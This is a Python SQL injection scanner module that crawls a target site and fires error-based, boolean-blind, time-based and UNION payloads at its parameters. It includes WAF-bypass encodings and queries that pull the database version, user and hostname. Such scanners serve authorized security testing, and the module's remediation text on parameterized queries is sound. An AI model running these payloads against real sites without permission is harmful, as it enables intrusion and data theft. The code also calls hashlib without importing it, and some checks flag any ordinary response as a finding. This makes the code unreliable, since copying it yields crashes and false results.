#!/usr/bin/env python3
"""
Advanced SQL Injection Vulnerability Scanner.
Tests for Error-based, Boolean-based blind, Time-based blind, and UNION-based SQLi.

References:
    - OWASP: https://owasp.org/www-community/attacks/SQL_Injection
    - PortSwigger: https://portswigger.net/web-security/sql-injection
    - CWE-89: SQL Injection
"""

import re
import time
import random
import string
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from loguru import logger


class Scanner:
    """Advanced SQL Injection vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize SQL injection scanner.
        
        Args:
            browser: StealthBrowser instance for HTTP requests
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Advanced SQL Injection Detection"
        
        # Unique markers for boolean detection
        self.true_marker = self._generate_marker()
        self.false_marker = self._generate_marker()
        
        # Timing threshold for time-based detection (seconds)
        self.time_threshold = 3.0
        
        # ============================================================================
        # Database Error Patterns
        # ============================================================================
        self.error_patterns = [
            # MySQL
            (r"SQL syntax.*MySQL", "MySQL"),
            (r"MySQLSyntaxErrorException", "MySQL"),
            (r"check the manual that corresponds to your MySQL server", "MySQL"),
            (r"Unknown column", "MySQL"),
            (r"You have an error in your SQL syntax", "MySQL"),
            
            # PostgreSQL
            (r"PostgreSQL.*ERROR", "PostgreSQL"),
            (r"Warning.*\Wpg_.*", "PostgreSQL"),
            (r"valid PostgreSQL result", "PostgreSQL"),
            (r"Unterminated string", "PostgreSQL"),
            
            # MSSQL
            (r"Microsoft SQL Native Client error", "MSSQL"),
            (r"\[SQL Server\]", "MSSQL"),
            (r"ODBC SQL Server Driver", "MSSQL"),
            (r"Unclosed quotation mark", "MSSQL"),
            (r"Incorrect syntax near", "MSSQL"),
            
            # Oracle
            (r"ORA-[0-9]{5}", "Oracle"),
            (r"Oracle error", "Oracle"),
            (r"Oracle.*Driver", "Oracle"),
            (r"Warning.*\Woci_.*", "Oracle"),
            (r"quoted string not properly terminated", "Oracle"),
            
            # SQLite
            (r"SQLite/JDBCDriver", "SQLite"),
            (r"SQLite.Exception", "SQLite"),
            (r"System.Data.SQLite.SQLiteException", "SQLite"),
            (r"near \"[^\"]+\": syntax error", "SQLite"),
            
            # Generic
            (r"SQL command not properly ended", "Generic"),
            (r"Syntax error in query", "Generic"),
            (r"Unclosed quotation mark after", "Generic"),
            (r"supplied argument is not a valid MySQL", "Generic"),
        ]
        
        # ============================================================================
        # Error-based Payloads
        # ============================================================================
        self.error_payloads = [
            # Basic injection chars
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            
            # Comment-based
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            
            # ORDER BY / GROUP BY
            "' ORDER BY 1--",
            "' ORDER BY 100--",
            "') ORDER BY 1--",
            "\" ORDER BY 1--",
            
            # UNION
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "') UNION SELECT NULL--",
            
            # Database version extraction
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            
            # Conversions (cause errors)
            "' AND 1=CONVERT(int, @@version)--",
            "' AND 1=CAST(@@version AS int)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
        ]
        
        # ============================================================================
        # Boolean-based Blind Payloads
        # ============================================================================
        self.boolean_payloads = [
            # AND-based
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("') AND 1=1--", "') AND 1=2--"),
            ('" AND 1=1--', '" AND 1=2--'),
            ("' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1"),
            
            # OR-based
            ("' OR 1=1--", "' OR 1=2--"),
            ("' OR '1'='1", "' OR '1'='2"),
            
            # String comparison
            ("' AND 'abcd'='abcd", "' AND 'abcd'='wxyz'"),
            ("' AND SUBSTRING('abc',1,1)='a", "' AND SUBSTRING('abc',1,1)='z"),
            
            # Numeric
            (" AND 1=1", " AND 1=2"),
            (" AND 10>5", " AND 10<5"),
            (" AND 5=5", " AND 5=9"),
        ]
        
        # ============================================================================
        # Time-based Blind Payloads
        # ============================================================================
        self.time_payloads = [
            # MySQL
            ("' OR SLEEP({time})--", "MySQL"),
            ("' AND SLEEP({time})--", "MySQL"),
            ("1' AND SLEEP({time})--", "MySQL"),
            ("' XOR SLEEP({time})--", "MySQL"),
            ("' OR BENCHMARK(5000000,MD5('a'))--", "MySQL"),
            
            # PostgreSQL
            ("' OR pg_sleep({time})--", "PostgreSQL"),
            ("'; SELECT pg_sleep({time})--", "PostgreSQL"),
            ("' AND pg_sleep({time})--", "PostgreSQL"),
            ("' OR (SELECT pg_sleep({time}))--", "PostgreSQL"),
            
            # MSSQL
            ("'; WAITFOR DELAY '00:00:{time}'--", "MSSQL"),
            ("' WAITFOR DELAY '00:00:{time}'--", "MSSQL"),
            ("1'; WAITFOR DELAY '00:00:{time}'--", "MSSQL"),
            
            # Oracle
            ("' OR DBMS_LOCK.SLEEP({time})--", "Oracle"),
            ("' AND DBMS_LOCK.SLEEP({time})--", "Oracle"),
            ("1' AND DBMS_LOCK.SLEEP({time})--", "Oracle"),
            
            # SQLite
            ("' OR randomblob(100000000)--", "SQLite"),
            ("' AND randomblob(100000000)--", "SQLite"),
            
            # Generic
            ("' OR SLEEP({time})--", "Generic"),
            ("1' OR SLEEP({time})--", "Generic"),
        ]
        
        # ============================================================================
        # UNION-based Payloads
        # ============================================================================
        self.union_payloads = [
            # Column count detection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            
            # String extraction
            "' UNION SELECT 'test'--",
            "' UNION SELECT 'test','test2'--",
            "' UNION SELECT 'test',NULL--",
            "' UNION SELECT NULL,'test'--",
            
            # Version extraction
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' UNION SELECT @@hostname--",
            
            # String concatenation for single column
            "' UNION SELECT CONCAT(@@version,0x3a,user())--",
            "' UNION SELECT version()||':'||user()--",
            "' UNION SELECT @@version+':'+user()--",
        ]
        
        # ============================================================================
        # WAF Bypass Payloads
        # ============================================================================
        self.waf_bypass_payloads = [
            # Case variation
            "' oR 1=1--",
            "' Or 1=1--",
            "' OR 1=1--",
            
            # URL encoding
            "%27%20OR%201%3D1--",
            "'%20OR%201=1--",
            
            # Double URL encoding
            "%2527%2520OR%25201%253D1--",
            
            # Unicode encoding
            "'\u0052 1=1--",
            
            # Null byte injection
            "' OR 1=1;%00",
            "admin'%00--",
            
            # Comment obfuscation
            "'/**/OR/**/1=1--",
            "'/**/OR/**/1/**/=/**/1--",
            "'/*!OR*/1=1--",
            
            # Whitespace variation
            "'\tOR\t1=1--",
            "'\nOR\n1=1--",
            "'\rOR\r1=1--",
        ]
    
    def _generate_marker(self, length: int = 8) -> str:
        """Generate unique random marker."""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
    
    # ============================================================================
    # Main Scan Method
    # ============================================================================
    
    def run(self) -> Dict:
        """
        Execute comprehensive SQL injection tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} for {self.target_url}")
        
        result = {
            'module': self.module_name,
            'target_url': self.target_url,
            'urls_tested': [],
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'findings': []
        }
        
        # Discover test points
        test_points = self._discover_test_points()
        logger.info(f"Discovered {len(test_points)} test points")
        
        for test_point in test_points:
            url = test_point['url']
            method = test_point['method']
            params = test_point['params']
            
            result['urls_tested'].append(url)
            
            for param_name in params:
                result['parameters_tested'].append(param_name)
                
                # ============================================================
                # Stage 1: Error-based SQLi
                # ============================================================
                error_result = self._test_error_based(url, method, param_name, params)
                if error_result:
                    result['vulnerable_parameters'].append(error_result)
                    logger.info(f"Error-based SQLi found: {url} -> {param_name} ({error_result['db_type']})")
                    continue  # Found, skip other tests for this parameter
                
                # ============================================================
                # Stage 2: Boolean-based Blind SQLi
                # ============================================================
                boolean_result = self._test_boolean_based(url, method, param_name, params)
                if boolean_result:
                    result['vulnerable_parameters'].append(boolean_result)
                    logger.info(f"Boolean-based blind SQLi found: {url} -> {param_name}")
                    continue
                
                # ============================================================
                # Stage 3: Time-based Blind SQLi
                # ============================================================
                time_result = self._test_time_based(url, method, param_name, params)
                if time_result:
                    result['vulnerable_parameters'].append(time_result)
                    logger.info(f"Time-based blind SQLi found: {url} -> {param_name} ({time_result['db_type']})")
                    continue
                
                # ============================================================
                # Stage 4: UNION-based SQLi
                # ============================================================
                union_result = self._test_union_based(url, method, param_name, params)
                if union_result:
                    result['vulnerable_parameters'].append(union_result)
                    logger.info(f"UNION-based SQLi found: {url} -> {param_name}")
                    continue
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            severity, cvss = self._calculate_severity(vuln['type'])
            
            finding = {
                'title': f"SQL Injection in '{vuln['parameter']}' ({vuln['type'].replace('_', ' ')})",
                'severity': severity,
                'description': self._build_description(vuln),
                'recommendation': self._build_recommendation(vuln),
                'module': self.module_name,
                'cwe_id': 'CWE-89',
                'cvss_score': cvss,
                'evidence': self._build_evidence(vuln),
                'references': [
                    'https://owasp.org/www-community/attacks/SQL_Injection',
                    'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
                    'https://portswigger.net/web-security/sql-injection',
                ]
            }
            
            self.findings.append(finding)
            result['findings'].append(finding)
        
        logger.info(
            f"{self.module_name} complete. "
            f"Tested {len(result['urls_tested'])} URLs, "
            f"{len(result['parameters_tested'])} parameters, "
            f"Found {len(result['vulnerable_parameters'])} vulnerabilities"
        )
        
        return result
    
    # ============================================================================
    # Discovery Methods
    # ============================================================================
    
    def _discover_test_points(self) -> List[Dict]:
        """Discover URLs and parameters to test."""
        test_points = []
        visited = set()
        
        # Main page
        test_points.append({
            'url': self.target_url,
            'method': 'GET',
            'params': {'id': '1', 'page': '1', 'q': 'test', 'search': 'test'}
        })
        
        # Common paths with parameters
        common_paths = [
            '/index.php?id=1',
            '/product.php?id=1',
            '/article.php?id=1',
            '/page.php?id=1',
            '/category.php?id=1',
            '/search.php?q=test',
            '/api/search?query=test',
        ]
        
        for path in common_paths:
            if '?' in path:
                base, query = path.split('?', 1)
                full_url = urljoin(self.target_url, base)
                params = parse_qs(query)
                params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_points.append({
                    'url': full_url,
                    'method': 'GET',
                    'params': params
                })
        
        # Discover forms
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(self.target_url, action) if action else self.target_url
                
                inputs = {}
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name')
                    if name:
                        inputs[name] = input_tag.get('value', 'test')
                
                if inputs:
                    test_points.append({
                        'url': form_url,
                        'method': method,
                        'params': inputs
                    })
        
        return test_points[:20]
    
    # ============================================================================
    # Error-based SQLi Detection
    # ============================================================================
    
    def _test_error_based(
        self, url: str, method: str, param_name: str, params: Dict
    ) -> Optional[Dict]:
        """Test for error-based SQL injection."""
        
        for payload in self.error_payloads[:10]:  # Test top 10 payloads
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self._send_request(url, method, test_params)
            
            if resp and resp.status_code == 200:
                db_type = self._detect_db_error(resp.text)
                
                if db_type:
                    return {
                        'url': url,
                        'parameter': param_name,
                        'type': 'error_based',
                        'db_type': db_type,
                        'payload': payload,
                        'method': method.upper()
                    }
        
        return None
    
    def _detect_db_error(self, response_text: str) -> Optional[str]:
        """Detect database type from error message."""
        for pattern, db_type in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
        return None
    
    # ============================================================================
    # Boolean-based Blind SQLi Detection
    # ============================================================================
    
    def _test_boolean_based(
        self, url: str, method: str, param_name: str, params: Dict
    ) -> Optional[Dict]:
        """Test for boolean-based blind SQL injection."""
        
        # Get baseline response
        baseline_params = params.copy()
        baseline_resp = self._send_request(url, method, baseline_params)
        
        if not baseline_resp or baseline_resp.status_code != 200:
            return None
        
        baseline_length = len(baseline_resp.text)
        baseline_key = hashlib.md5(baseline_resp.text.encode()).hexdigest()
        
        for true_payload, false_payload in self.boolean_payloads[:8]:
            # Test TRUE condition
            true_params = params.copy()
            true_params[param_name] = true_payload
            true_resp = self._send_request(url, method, true_params)
            
            if not true_resp or true_resp.status_code != 200:
                continue
            
            # Test FALSE condition
            false_params = params.copy()
            false_params[param_name] = false_payload
            false_resp = self._send_request(url, method, false_params)
            
            if not false_resp or false_resp.status_code != 200:
                continue
            
            # Compare responses
            true_length = len(true_resp.text)
            false_length = len(false_resp.text)
            true_key = hashlib.md5(true_resp.text.encode()).hexdigest()
            false_key = hashlib.md5(false_resp.text.encode()).hexdigest()
            
            # Boolean injection detected if responses differ
            if true_key != false_key:
                return {
                    'url': url,
                    'parameter': param_name,
                    'type': 'boolean_based_blind',
                    'db_type': 'Unknown',
                    'payload': true_payload,
                    'method': method.upper(),
                    'evidence': {
                        'baseline_length': baseline_length,
                        'true_length': true_length,
                        'false_length': false_length,
                    }
                }
        
        return None
    
    # ============================================================================
    # Time-based Blind SQLi Detection
    # ============================================================================
    
    def _test_time_based(
        self, url: str, method: str, param_name: str, params: Dict
    ) -> Optional[Dict]:
        """Test for time-based blind SQL injection."""
        
        # Get baseline response time
        baseline_params = params.copy()
        start = time.time()
        baseline_resp = self._send_request(url, method, baseline_params)
        baseline_time = time.time() - start
        
        # If baseline is already slow, skip
        if baseline_time > 2.0:
            return None
        
        sleep_time = int(self.time_threshold)
        
        for payload_template, db_type in self.time_payloads[:12]:
            payload = payload_template.format(time=sleep_time)
            
            test_params = params.copy()
            test_params[param_name] = payload
            
            start = time.time()
            resp = self._send_request(url, method, test_params)
            elapsed = time.time() - start
            
            # Time-based injection detected if response is significantly delayed
            if elapsed >= self.time_threshold:
                return {
                    'url': url,
                    'parameter': param_name,
                    'type': 'time_based_blind',
                    'db_type': db_type,
                    'payload': payload,
                    'method': method.upper(),
                    'evidence': {
                        'baseline_time': round(baseline_time, 3),
                        'injection_time': round(elapsed, 3),
                        'delay_threshold': self.time_threshold,
                    }
                }
        
        return None
    
    # ============================================================================
    # UNION-based SQLi Detection
    # ============================================================================
    
    def _test_union_based(
        self, url: str, method: str, param_name: str, params: Dict
    ) -> Optional[Dict]:
        """Test for UNION-based SQL injection."""
        
        # Step 1: Find number of columns using ORDER BY
        column_count = self._find_column_count(url, method, param_name, params)
        
        if column_count and column_count > 0:
            # Step 2: Test UNION with found column count
            nulls = ','.join(['NULL'] * column_count)
            union_payload = f"' UNION SELECT {nulls}--"
            
            test_params = params.copy()
            test_params[param_name] = union_payload
            
            resp = self._send_request(url, method, test_params)
            
            if resp and resp.status_code == 200:
                return {
                    'url': url,
                    'parameter': param_name,
                    'type': 'union_based',
                    'db_type': 'Unknown',
                    'payload': union_payload,
                    'method': method.upper(),
                    'evidence': {
                        'column_count': column_count,
                    }
                }
        
        # Try standard UNION payloads
        for payload in self.union_payloads[:8]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self._send_request(url, method, test_params)
            
            if resp and resp.status_code == 200:
                db_type = self._detect_db_error(resp.text)
                
                if db_type or 'UNION' in resp.text.upper():
                    return {
                        'url': url,
                        'parameter': param_name,
                        'type': 'union_based',
                        'db_type': db_type or 'Unknown',
                        'payload': payload,
                        'method': method.upper(),
                    }
        
        return None
    
    def _find_column_count(
        self, url: str, method: str, param_name: str, params: Dict
    ) -> Optional[int]:
        """Find number of columns using ORDER BY technique."""
        
        for i in range(1, 30):  # Test up to 30 columns
            payload = f"' ORDER BY {i}--"
            
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self._send_request(url, method, test_params)
            
            if resp and resp.status_code != 200:
                return i - 1  # Previous count was valid
            
            # Check for error messages
            if resp:
                db_type = self._detect_db_error(resp.text)
                if db_type and i > 1:
                    return i - 1
        
        return None
    
    # ============================================================================
    # Utility Methods
    # ============================================================================
    
    def _send_request(self, url: str, method: str, params: Dict):
        """Send HTTP request with given method and parameters."""
        if method.lower() == 'post':
            return self.browser.post(url, data=params)
        else:
            return self.browser.get(url, params=params)
    
    def _calculate_severity(self, vuln_type: str) -> Tuple[str, float]:
        """Calculate severity and CVSS based on vulnerability type."""
        if vuln_type == 'error_based':
            return 'critical', 9.8
        elif vuln_type == 'boolean_based_blind':
            return 'critical', 9.5
        elif vuln_type == 'time_based_blind':
            return 'high', 8.5
        elif vuln_type == 'union_based':
            return 'critical', 9.8
        else:
            return 'high', 7.5
    
    def _build_description(self, vuln: Dict) -> str:
        """Build vulnerability description."""
        descriptions = {
            'error_based': (
                f"Error-based SQL Injection detected in parameter '{vuln['parameter']}' "
                f"at {vuln['url']}. "
                f"Database type: {vuln['db_type']}. "
                f"The application returns database error messages, allowing attackers "
                f"to extract data through crafted SQL queries."
            ),
            'boolean_based_blind': (
                f"Boolean-based blind SQL Injection detected in parameter '{vuln['parameter']}' "
                f"at {vuln['url']}. "
                f"The application behaves differently for TRUE/FALSE SQL conditions, "
                f"allowing attackers to extract data one bit at a time."
            ),
            'time_based_blind': (
                f"Time-based blind SQL Injection detected in parameter '{vuln['parameter']}' "
                f"at {vuln['url']}. "
                f"Database type: {vuln['db_type']}. "
                f"The application responds with a delay when SQL time functions are injected, "
                f"allowing attackers to extract data through timing analysis."
            ),
            'union_based': (
                f"UNION-based SQL Injection detected in parameter '{vuln['parameter']}' "
                f"at {vuln['url']}. "
                f"The application is vulnerable to UNION queries, allowing attackers "
                f"to combine results from different database tables."
            ),
        }
        
        return descriptions.get(
            vuln['type'],
            f"SQL Injection vulnerability detected in parameter '{vuln['parameter']}' "
            f"at {vuln['url']}."
        )
    
    def _build_recommendation(self, vuln: Dict) -> str:
        """Build remediation recommendation."""
        return (
            "1. Use parameterized queries (prepared statements) for ALL database access\n"
            "2. Never concatenate user input into SQL queries\n"
            "3. Implement input validation and whitelisting\n"
            "4. Use stored procedures with strict parameter typing\n"
            "5. Apply principle of least privilege to database accounts\n"
            "6. Implement Web Application Firewall (WAF) rules\n"
            "7. Escape all user-supplied input if parameterization is not possible\n"
            "8. Use ORM frameworks that handle SQL safely by default\n\n"
            "Example (Python with parameterized query):\n"
            "  cursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_input,))\n\n"
            "Example (PHP with PDO):\n"
            "  $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');\n"
            "  $stmt->execute(['id' => $user_input]);"
        )
    
    def _build_evidence(self, vuln: Dict) -> str:
        """Build evidence string."""
        evidence = (
            f"URL: {vuln['url']}\n"
            f"Parameter: {vuln['parameter']}\n"
            f"Type: {vuln['type'].replace('_', ' ')}\n"
            f"Method: {vuln['method']}\n"
            f"Payload: {vuln.get('payload', 'N/A')}\n"
        )
        
        if 'db_type' in vuln and vuln['db_type'] != 'Unknown':
            evidence += f"Database: {vuln['db_type']}\n"
        
        if 'evidence' in vuln and isinstance(vuln['evidence'], dict):
            for key, val in vuln['evidence'].items():
                evidence += f"{key}: {val}\n"
        
        return evidence